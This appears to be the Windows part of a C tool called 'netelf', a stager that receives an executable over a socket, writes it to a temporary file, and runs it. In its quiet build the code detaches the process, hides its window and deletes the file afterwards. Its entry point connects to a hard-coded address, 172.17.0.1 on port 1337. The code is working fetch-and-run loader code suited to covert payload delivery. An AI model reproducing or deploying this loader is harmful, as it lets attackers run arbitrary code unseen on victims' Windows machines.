#define NETELF_OVERRIDE_FILE
#define USE_RECV

#ifdef NODEFAULTLIB
# define QUIET
# define NEED_MEMSET
# define NEED_WIN32_MALLOC_FREE
# define NETELF_NEED_LIB_C
#else
# ifdef __POCC__
#  include <stdio.h>
# endif
#endif

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "wsock32.lib")
#include <windows.h>


#ifdef NEED_WIN32_MALLOC_FREE
void *malloc(size_t size) {
	return HeapAlloc(GetProcessHeap(), 0, size);
}

void free(void *ptr) {
	HeapFree(GetProcessHeap(), 0, ptr);
}
#endif

struct ne_file_s {
	TCHAR name[MAX_PATH];
	HANDLE handle;
};
typedef struct ne_file_s ne_file_t;

static int
file_open(file)
	ne_file_t *file;
{
	TCHAR lpTempPathBuffer[MAX_PATH];
	DWORD dwShareMode;
	DWORD dwFlagsAndAttributes;
	HANDLE hFile;

	if (!GetTempPath(MAX_PATH, lpTempPathBuffer))
		return 1;

	if (!GetTempFileName(lpTempPathBuffer, NULL, 0, file->name))
		return 2;

	dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE;
	dwFlagsAndAttributes = FILE_ATTRIBUTE_TEMPORARY;
	hFile = CreateFile(file->name, GENERIC_WRITE, dwShareMode, NULL, OPEN_EXISTING, dwFlagsAndAttributes, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return 3;

	file->handle = hFile;
	return 0;
}


static unsigned int
file_write(file, buf, nbytes)
	ne_file_t *file;
	void *buf;
	unsigned int nbytes;
{
	DWORD byteswritten = 0;
	WriteFile(file->handle, buf, nbytes, &byteswritten, NULL);
	return byteswritten;
}


static int
file_exec(file, argv)
	ne_file_t *file;
	char **argv;
{
	STARTUPINFO startInfo;
	PROCESS_INFORMATION processInfo;
	DWORD dwFlags = 0;
	BOOL ret;

	ZeroMemory(&startInfo, sizeof(startInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));

	startInfo.cb = sizeof(startInfo);
	startInfo.dwFlags = STARTF_USESHOWWINDOW;	
	
#ifdef QUIET
	dwFlags = DETACHED_PROCESS;
# ifdef CREATE_NO_WINDOW
	dwFlags |= CREATE_NO_WINDOW;
# endif
	startInfo.wShowWindow = SW_HIDE;
#endif

	CloseHandle(file->handle);
	ret = CreateProcessA(file->name, NULL, NULL, NULL, FALSE,
					     dwFlags, NULL, NULL, &startInfo, &processInfo);
#ifndef QUIET
	if (!ret) {
		perror("CreateProcessA");
	}
#endif

	DeleteFile(file->name);

	if (ret) {
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}

	return ret ? 0 : 1;
}



#ifdef NODEFAULTLIB
# define NETELF_NO_MAIN
static int run_netelf(const char *ip_addr, int port);

void WinMainCRTStartup()
{
	ExitProcess(run_netelf("172.17.0.1", 1337));
}
#endif
